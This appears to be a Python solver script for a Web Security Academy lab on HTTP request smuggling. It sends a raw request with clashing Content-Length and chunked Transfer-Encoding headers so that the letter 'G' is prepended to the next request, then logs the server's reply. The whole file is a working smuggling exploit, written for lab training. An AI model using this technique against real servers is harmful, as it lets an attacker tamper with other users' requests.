from web_security_academy.core.logger import logger
from urllib.parse import urlparse


def solve_lab(session):
    hostname = urlparse(session.url).hostname
    smuggled_prefix = "G"

    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Content-Length: {len(smuggled_prefix) + 5}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"{smuggled_prefix}"
    ).encode()

    session.send_raw(payload)
    logger.info("Prepended the letter G to the next request")

    resp = session.post_path("/")
    logger.info("Received the following response after sending POST request:")
    logger.info(resp.text)
